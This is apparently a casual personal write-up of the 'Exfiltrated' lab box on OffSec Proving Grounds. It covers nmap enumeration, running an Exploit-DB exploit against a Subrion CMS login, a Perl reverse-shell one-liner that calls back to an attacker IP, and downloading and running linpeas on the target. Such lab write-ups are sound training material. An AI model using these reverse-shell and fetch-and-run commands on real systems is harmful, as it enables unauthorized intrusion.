---
aliases:
  - Exfiltrated
tags:
  - pg-playground
  - linux
  - enumeration
  - exploitation
os: Linux
difficulty: Easy
date: 2025-04-11
status: owned
---

## Box Summary

| Field              | Value                |
| ------------------ | -------------------- |
| **Name**           | Exfiltrated          |
| **IP**             | `192.168.198.163`    |
| **OS**             | Linux                |
| **Difficulty**     | Easy                 |
| **Date Completed** | 11 Apr 2025          |
| **Exploited Via**  | RCE or PrivEsc Chain |
| **Flags Captured** | ✅ Root, ✅ User       |

---

### 2. Enumeration

Quick Nmap Scan just to see what's going on as usual:

```
nmap -sCV -p- -T4 192.168.198.163
```

Output:

```
┌──(kali㉿kali)-[~/Desktop]
└─$ nmap -sCV -p- -T4 192.168.198.163
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-10 22:45 EDT
Nmap scan report for 192.168.198.163
Host is up (0.037s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 c1:99:4b:95:22:25:ed:0f:85:20:d3:63:b4:48:bb:cf (RSA)
|   256 0f:44:8b:ad:ad:95:b8:22:6a:f0:36:ac:19:d0:0e:f3 (ECDSA)
|_  256 32:e1:2a:6c:cc:7c:e6:3e:23:f4:80:8d:33:ce:9b:3a (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-robots.txt: 7 disallowed entries 
| /backup/ /cron/? /front/ /install/ /panel/ /tmp/ 
|_/updates/
|_http-title: Did not follow redirect to http://exfiltrated.offsec/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.57 seconds
```

From here we can see port 80 and port 22 is open, and just searching for the ip in my browser doesnt give me a anything, so we gonna try the links 1 by 1.

![[Exfiltrated-1744341273064.jpeg]]


After much trial and error and hardwork (I'm kidding it wasn't hard at all), we find ourself some weird login page, so whats the next step to do ? try out some useless username and password like admin:admin, but nah, no way this is gonna be this easy. Imma just google for exploits:

![[Exfiltrated-1744341434736.jpeg]]

Like all script kiddies do I'm just gonna use my trusty [exploitDB](https://www.exploit-db.com/exploits/49876) and copy and paste the python code. 

🔹 Create & Activate Virtual Environment
```
python3 -m venv afu-venv
source afu-venv/bin/activate
```

🔹 Install Dependencies
```
pip install requests bs4
```

So we run the exploit:

![[Exfiltrated-1744342000765.jpeg]]

and we just happen to get in: cool beans, so ngl, I just found out that theres this thing called revshells.com after looking at an online guide because idk how to continue, but DAMN:

![[Exfiltrated-1744342348811.jpeg]]


```
perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"192.168.45.233:4444");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```

ngl, this feels abit underwhelming:

![[Exfiltrated-1744342402815.jpeg]]

but alls good, we have a listener on 4444 on the other end so we gonna upgrade the shell (ngl this guy is pretty genius)

```
python3 -c 'import pty;pty.spawn("/bin/bash")'; export TERM=xterm-256color
```

Okay time to document how this whole linpeas shit works:

```
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
chmod +x linpeas.sh
```

Host http server:

```
python3 -m http.server 8000
```

On the shell you opened:

```
wget http://192.168.45.233:8000/linpeas.sh -O /tmp/linpeas.sh
chmod +x /tmp/linpeas.sh
/tmp/linpeas.sh
```

Output:

```
www-data@exfiltrated:/var/www/html/subrion/uploads$ wget http://192.168.45.233:8000/linpeas.sh -O /tmp/linpeas.sh
chmod +x /tmp/linpeas.sh
/tmp/linpeas.sh
<//192.168.45.233:8000/linpeas.sh -O /tmp/linpeas.sh
--2025-04-11 03:47:49--  http://192.168.45.233:8000/linpeas.sh
Connecting to 192.168.45.233:8000... chmod +x /tmp/linpeas.sh
/tmp/linpeas.sh
connected.
HTTP request sent, awaiting response... 200 OK
Length: 840085 (820K) [text/x-sh]
Saving to: ‘/tmp/linpeas.sh’

/tmp/linpeas.sh     100%[===================>] 820.40K  3.54MB/s    in 0.2s    

2025-04-11 03:47:49 (3.54 MB/s) - ‘/tmp/linpeas.sh’ saved [840085/840085]

www-data@exfiltrated:/var/www/html/subrion/uploads$ chmod +x /tmp/linpeas.sh
www-data@exfiltrated:/var/www/html/subrion/uploads$ /tmp/linpeas.sh
```

![[Exfiltrated-1744344088505.jpeg]]

![[Exfiltrated-1744344314630.jpeg]]